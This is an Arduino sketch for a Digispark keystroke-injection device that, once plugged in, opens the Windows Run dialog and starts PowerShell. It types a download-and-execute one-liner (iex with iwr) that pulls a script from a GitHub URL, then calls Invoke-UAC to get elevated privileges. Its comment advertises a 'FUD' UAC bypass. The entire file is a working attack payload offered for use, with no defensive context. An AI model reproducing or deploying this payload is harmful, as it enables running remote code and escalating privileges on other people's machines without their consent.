#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

/* Bypass UAC FUD 
 * https://github.com/BlackShell256/Invoke-UAC
 */


void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("iex (iwr -UsebasicParsing https://raw.githubusercontent.com/BlackShell256/Bypass-Uac/main/Invoke-UAC.ps1)"));
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Invoke-UAC -Executable powershell");
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(900000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
